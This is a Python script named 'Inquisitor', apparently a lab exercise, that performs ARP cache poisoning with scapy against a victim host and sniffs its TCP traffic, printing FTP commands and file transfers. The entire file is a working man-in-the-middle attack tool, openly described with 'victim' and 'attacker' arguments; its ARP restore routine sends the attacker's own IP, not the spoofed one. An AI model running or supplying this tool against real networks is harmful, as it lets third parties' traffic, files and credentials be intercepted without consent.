import sys
import time
import argparse
from threading import Thread
from scapy.all import ARP, send, sniff, TCP, Raw, get_if_addr

def arp_spoof(target_ip, spoof_ip, target_mac):
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=False)

def restore_arp(target_ip, target_mac, source_mac):
    source_ip = get_if_addr("eth0")
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac)
    send(packet, count=5, verbose=False)

def sniff_ftp_packets():
    print("[*] Sniffing FTP traffic...")

    def process_packet(pkt):
        if pkt.haslayer(TCP) and pkt.haslayer(Raw):
            payload = pkt[Raw].load.decode(errors='ignore')
            if verbose == True:
                print(f"[FTP] Event detected: {payload.strip()}")
            elif 'STOR' in payload or 'PUT' in payload or 'RETR' in payload:
                print(f"[FTP] Exchange file: {payload.strip()}")

    sniff(filter="tcp", prn=process_packet, iface="eth0", store=0)

def loop_spoof(args):
    while True:
        arp_spoof(args.IPtarget, args.IPsrc, args.MACtarget)
        time.sleep(1)

def main():
    parser = argparse.ArgumentParser(prog="Inquisitor", description="ARP poisoning")
    parser.add_argument("IPsrc", type=str, help="the IP to spoof (IP spoof)")
    parser.add_argument("MACsrc", type=str, help="the attacker's MAC (your MAC address)")
    parser.add_argument("IPtarget", type=str, help="the victim's IP address")
    parser.add_argument("MACtarget", type=str, help="the victim's MAC")
    parser.add_argument("-v", action="store_true", help="Sniff all event")
    args = parser.parse_args()
    global verbose
    verbose = args.v
    print(f"Verbose = {verbose}")
    try:
        spoof_thread = Thread(target=lambda: loop_spoof(args))
        spoof_thread.daemon = True
        spoof_thread.start()

        # Start sniffing packets
        sniff_ftp_packets()
    except KeyboardInterrupt:
        print("[C^] Attack closed")
        restore_arp(args.IPtarget, args.MACtarget, args.MACsrc)

if __name__ == "__main__":
    sys.exit(main())